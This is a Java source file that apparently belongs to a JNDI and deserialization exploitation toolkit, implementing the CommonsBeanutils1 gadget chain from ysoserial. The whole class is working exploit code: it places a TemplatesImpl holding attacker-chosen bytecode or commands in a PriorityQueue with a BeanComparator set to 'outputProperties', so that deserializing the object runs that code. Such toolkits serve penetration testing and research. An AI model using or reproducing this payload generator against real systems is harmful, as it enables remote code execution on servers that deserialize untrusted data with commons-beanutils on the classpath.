package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.Serializer;
import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.PriorityQueue;

import static com.qi4l.jndi.Starter.cmdLine;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({Authors.FROHOFF})
public class CommonsBeanutils1 implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object template;
        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
            template = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            template = Gadgets.createTemplatesImpl(type, param);
        }
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});

        return queue;
    }
}
